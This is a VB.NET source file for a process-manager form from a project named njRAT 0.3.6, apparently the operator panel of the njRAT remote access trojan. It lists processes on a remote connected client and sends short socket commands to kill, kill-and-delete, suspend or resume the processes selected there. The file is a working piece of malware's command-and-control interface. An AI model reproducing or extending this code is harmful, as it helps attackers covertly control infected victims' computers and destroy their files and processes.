Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class proc
    Public ID As Integer
    Public osk As Client
    Public sk As Client
    Public Sub New()
        Me.ID = 0
        Me.InitializeComponent()
    End Sub

    Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillDeleteToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("kd" & str))
        End If
    End Sub

    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("k" & str))
        End If
    End Sub

    Private Sub proc_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.sk.CN = False
    End Sub

    Private Sub proc_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.sk.Send("~")
        Me.Text = Conversions.ToString(ind.vno(Me.osk.L))
        Me.Timer1.Enabled = True
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.sk.Send("~")
    End Sub

    Private Sub ResumeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumeToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("res" & str))
        End If
    End Sub

    Private Sub SL_Click(sender As Object, e As EventArgs) Handles SL.Click
        Me.SL.Text = ""
    End Sub

    Private Sub SuspendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("sus" & str))
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Controls.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As Control = DirectCast(enumerator.Current, Control)
                    current.Enabled = False
                Loop
                Return
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
        If (Not Me.osk.CN Or Not Me.sk.CN) Then
            Dim enumerator2 As IEnumerator
            Try
                enumerator2 = Me.Controls.GetEnumerator
                Do While enumerator2.MoveNext
                    Dim control2 As Control = DirectCast(enumerator2.Current, Control)
                    control2.Enabled = False
                Loop
            Finally
                If TypeOf enumerator2 Is IDisposable Then
                    TryCast(enumerator2, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub
End Class